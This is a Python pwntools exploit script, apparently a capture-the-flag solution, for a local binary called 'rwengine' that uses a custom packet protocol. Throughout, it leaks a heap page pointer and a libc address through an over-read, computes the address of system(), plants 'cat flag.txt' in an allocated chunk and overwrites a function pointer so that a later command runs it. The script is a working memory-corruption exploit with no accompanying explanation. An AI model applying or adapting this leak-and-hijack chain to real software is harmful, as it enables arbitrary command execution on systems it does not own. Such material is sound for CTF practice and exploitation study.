from pwn import *
import struct

context.log_level = 'info'

io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './rwengine'])

def send_pkt(cmd, data=b""):
    length = len(data)
    header = struct.pack(">BH", cmd, length)
    io.send(header + data)

def recv_pkt():
    res_hdr = io.recvn(3)
    status, length = struct.unpack(">BH", res_hdr)
    resp = b""
    if length > 0:
        resp = io.recvn(length)
    return status, resp

# Step 1: Leak
send_pkt(0x10, b" " * 200)
status, resp = recv_pkt()

page_ptr = u64(resp[543:551])
toupper_addr = u64(resp[551:559])

libc = ELF("./libc.so.6")
libc_base = toupper_addr - libc.symbols['toupper']
system_addr = libc_base + libc.symbols['system']

print(f"page_ptr = {hex(page_ptr)}")
print(f"libc_base = {hex(libc_base)}")
print(f"system_addr = {hex(system_addr)}")

# Step 2: Allocate Chunk 0 size 0x100
send_pkt(0x12, struct.pack(">H", 0x100))
status, resp = recv_pkt()
chunk0_idx = struct.unpack(">H", resp)[0]

# Step 3: Write "cat flag.txt\x00" into Chunk 0
cmd_str = b"cat flag.txt\x00"
send_pkt(0x14, struct.pack(">H", chunk0_idx) + cmd_str)
status, resp = recv_pkt()

# Step 4: Command 0x15
send_pkt(0x15)
status, resp = recv_pkt()

# Step 5: Command 0x10 overwrite
payload = p64(0) + p64(system_addr) + p64(page_ptr)
send_pkt(0x10, payload)
status, resp = recv_pkt()

# Step 6: Command 0x16
send_pkt(0x16)

# Read status of Command 0x16
status, resp = recv_pkt()
print(f"Command 0x16 status: {status}, resp: {resp}")

# Now read remaining output from stdout (which should be system output!)
remaining = io.recvrepeat(timeout=2)
print("REMAINING OUTPUT:")
print(remaining)
